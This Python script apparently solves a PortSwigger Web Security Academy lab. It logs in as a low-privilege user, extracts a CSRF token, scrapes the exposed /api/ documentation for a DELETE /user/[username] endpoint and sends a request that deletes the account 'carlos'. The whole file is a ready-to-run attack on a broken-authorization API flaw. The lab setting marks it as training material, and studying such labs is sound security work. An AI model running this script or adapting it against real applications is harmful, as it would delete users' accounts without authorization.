#!/usr/bin/env python3
import argparse
import re
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup


def get_csrf_from_login(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if not token or not token.get("value"):
        raise RuntimeError("CSRF token not found on login page.")
    return token["value"]


def login(session: requests.Session, base_url: str, username: str, password: str) -> None:
    login_url = urljoin(base_url, "/login")
    r = session.get(login_url, timeout=10)
    r.raise_for_status()
    csrf = get_csrf_from_login(r.text)

    data = {
        "csrf": csrf,
        "username": username,
        "password": password,
    }
    r = session.post(login_url, data=data, timeout=10)
    if "Log out" not in r.text:
        raise RuntimeError("Login failed, 'Log out' not found.")


def discover_delete_endpoint(session: requests.Session, base_url: str) -> str:
    """
    Fetch the auto-exposed API documentation from /api/ and dynamically locate
    a DELETE endpoint that takes a username placeholder.
    """
    api_index = urljoin(base_url, "/api/")
    r = session.get(api_index, timeout=10)
    r.raise_for_status()
    text = r.text

    # Example line: DELETE<tags>/user/[username]
    # Works only if we know the exact pattern
    m = re.search(r"DELETE.*?(/user/\[username\])", text, re.DOTALL)
    if not m:
        raise RuntimeError("Could not find DELETE ... [username] pattern in API index.")
    path_template = m.group(1)

    # Normalize to absolute API path
    if not path_template.startswith("/"):
        path_template = "/" + path_template
    if not path_template.startswith("/api"):
        path_template = "/api" + path_template

    delete_path = path_template.replace("[username]", "carlos")
    return urljoin(base_url, delete_path)


def main():
    parser = argparse.ArgumentParser(
        description="Lab: Exploiting an API endpoint using documentation"
    )
    parser.add_argument("base_url", help="Base URL of the lab.")
    parser.add_argument("--user", default="wiener")
    parser.add_argument("--password", default="peter")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    s = requests.Session()

    print("[*] Logging in...")
    login(s, base_url, args.user, args.password)
    print("[+] Logged in as", args.user)

    print("[*] Discovering DELETE endpoint from /api/ docs...")
    delete_url = discover_delete_endpoint(s, base_url)
    print(f"[+] Discovered delete URL for carlos: {delete_url}")

    print("[*] Sending DELETE request...")
    r = s.delete(delete_url, timeout=10)
    print(f"[+] Response status: {r.status_code}")
    print(r.text[:300])

    if r.status_code in (200, 204):
        print("[+] If this is the PortSwigger lab, carlos should now be deleted.")
    else:
        print("[-] Deletion may have failed; check response and lab state.")


if __name__ == "__main__":
    main()
